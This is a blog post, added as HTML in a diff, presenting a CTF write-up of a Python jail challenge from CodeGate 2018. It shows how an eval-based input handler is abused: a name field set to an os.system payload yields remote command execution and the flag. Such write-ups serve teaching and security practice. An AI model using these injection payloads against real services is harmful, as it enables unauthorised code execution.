@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Writeup (CTF) - ImpelDown CodeGate PreQuals 2018 (MISC) | Doomsday Vault</title>
+<meta name="generator" content="Jekyll v3.9.5" />
+<meta property="og:title" content="Writeup (CTF) - ImpelDown CodeGate PreQuals 2018 (MISC)" />
+<meta name="author" content="X-C3LL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Solution to an easy python jail challenge" />
+<meta property="og:description" content="Solution to an easy python jail challenge" />
+<link rel="canonical" href="http://localhost:4000/posts/2018/02/03/impeldown-python-jail.html" />
+<meta property="og:url" content="http://localhost:4000/posts/2018/02/03/impeldown-python-jail.html" />
+<meta property="og:site_name" content="Doomsday Vault" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2018-02-03T11:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup (CTF) - ImpelDown CodeGate PreQuals 2018 (MISC)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"X-C3LL"},"dateModified":"2018-02-03T11:00:00+01:00","datePublished":"2018-02-03T11:00:00+01:00","description":"Solution to an easy python jail challenge","headline":"Writeup (CTF) - ImpelDown CodeGate PreQuals 2018 (MISC)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/2018/02/03/impeldown-python-jail.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.jpg"},"name":"X-C3LL"},"url":"http://localhost:4000/posts/2018/02/03/impeldown-python-jail.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=c27a30cb27997bd3ed45ba5a77bd97bd27cbeb64">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+
+        <h1><a href="http://localhost:4000/">Doomsday Vault</a></h1>
+
+        
+          <img src="/assets/img/logo.jpg" alt="Logo" />
+        
+
+        <p>X-C3LL's Personal Blog :)</p>
+
+
+        
+        <ul class="downloads">
+          <li><a href="https://twitter.com/TheXC3LL">@TheXC3LL<strong>Twitter</strong></a></li>
+          <li><a href="https://www.linkedin.com/in/thexc3ll/">thexc3ll<strong>LinkedIn</strong></a></li>
+          <li><a href="https://mastodon.social/@XC3LL">@XC3LL<strong>Mastodon</strong></a></li>
+        </ul>
+        
+               <nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+  <li><a href="/about.html">About</a></li>
+    <li><a href="/cves.html">CVEs</a></li>
+    <li><a href="/tools.html">Tools</a></li>
+    <li><a href="/stuff.html">Slides & Articles</a></li>
+  <li><a href="/rss.xml">RSS</a>/<a href="/atom.xml">Atom</a></li>
+  
+</ul>
+</nav>
+      </header>
+      <section>
+
+      <small>3 February 2018</small>
+<h1>Writeup (CTF) - ImpelDown CodeGate PreQuals 2018 (MISC)</h1>
+
+
+<p>        
+This weekend was the second that we play CTFs together as <a href="https://ctftime.org/team/50611">ID-10-T</a> team. We try to play two CTFs at same time (Sharif &amp; CodeGate Prequals), but we have learned a lesson: we are not ready to play two CTFs simultaneously at this moment. We ranked as 2nd at Sharif CTF and 47th at CodeGate Prequals (not bad, but it was an overkill weekend). Lets see how we solved “ImpelDown” challenge.</p>
+
+<h2 id="impeldown">ImpelDown</h2>
+
+<p>Let’s connect to the server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc ch41l3ng3s.codegate.kr 2014
+
+                    __
+          PyJail   /__\
+       ____________|  |
+       |_|_|_|_|_|_|  |
+       |_|_|_|_|_|_|__|
+      A@\|_|_|_|_|_|/@@Aa
+   aaA@@@@@@@@@@@@@@@@@@@aaaA
+  A@@@@@@@@@@@@@@@@@@@@@@@@@@A
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[!] Rule
+1. After 3 day, the Light will be Turned Off then you Cannot see anything.
+2. Cannot Use Some Special Characters in PyJail.
+3. For 10 days, You can enter 38 characters per day.
+
+Can You Escape from Here ??
+
+ Name : aaaaaaaaaaaa
+[day-1]
+################## Work List ##################
+  coworker        : Find Coworker For Escape
+  tool            : Find Any Tool
+  dig             : Go Deep~
+  bomb            : make boooooooomb!!!
+###############################################
+tool(),
+ aaaaaaaaaaaa : [Tool] Find : Knife !
+Traceback (most recent call last):
+  File "/home/impel_down/Impel_Down.py", line 141, in &lt;module&gt;
+    watcher.Behavior_analysis(result)
+  File "/home/impel_down/Impel_Down.py", line 67, in Behavior_analysis
+    player_info = pickle.loads(Player)
+  File "/usr/lib/python2.7/pickle.py", line 1387, in loads
+    file = StringIO(str)
+TypeError: StringIO() argument 1 must be string or buffer, not tuple
+
+</code></pre></div></div>
+
+<p>Ooops. That was an easy bug to trigger. Looks like some type of python jail, where we can set an username and then start sending pre-built actions (tool, dig, bomb…) like in a game. But the interesing thing here is that “pickle” error. We can keep poking around a bit more:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tool(),cmd
+" : [Tool] Find : gun !
+Traceback (most recent call last):
+ File "/home/impel_down/Impel_Down.py", line 140, in &lt;module&gt;
+   result = eval("your."+work+"()")
+ File "&lt;string&gt;", line 1, in &lt;module&gt;
+TypeError: 'str' object is not callable
+</code></pre></div></div>
+
+<p>Oh, nice. They are doing a concatenation of “your.” + what we write as “action” + “()”, so the point here is to see what we can do with that “your”. Maybe we can exfiltrate more information calling the built-in help() ? (Spoiler: it worked):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tool(),help(your),
+
+ " : [Tool] Find : book !
+
+Help on instance of Esacpe_Player in module __main__:
+
+class Esacpe_Player
+
+ |  Methods defined here:
+
+ |  
+
+ |  __init__(self, name, day)
+
+ |  
+
+ |  bomb(self)
+
+ |  
+
+ |  coworker(self)
+
+ |  
+
+ |  dig(self)
+
+ |  
+
+ |  tool(self)
+
+</code></pre></div></div>
+
+<p>Did you see that “name”?. At this point is pretty clear what we have to do to solve this challenge and escape from the jail: insert a payload to our name and then reference it inside the eval(). We choose <code class="language-plaintext highlighter-rouge">__import__('os').system('ls')</code> as our name and <code class="language-plaintext highlighter-rouge">tool(),eval(your.name),</code> as action:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tool(),eval(your.name),
+__import__('os').system('ls') : [Tool] Find : Knife !                                    │
+Impel_Down.py                                                                             │
+run.sh
+</code></pre></div></div>
+
+<p>Din, din, din! We have a cool RCE on this challenge. Just search in the filesystem for the flag and win your points :)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLAG{Pyth0n J@il escape 1s always fun @nd exc1ting ! :)}
+</code></pre></div></div>
+
+<h2 id="final-words">Final words</h2>
+
+<p>This was a really easy (and funny) challenge. It worked as a break to my mind in this killer weekend.</p>
+
+
+
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/pages-themes">pages-themes</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
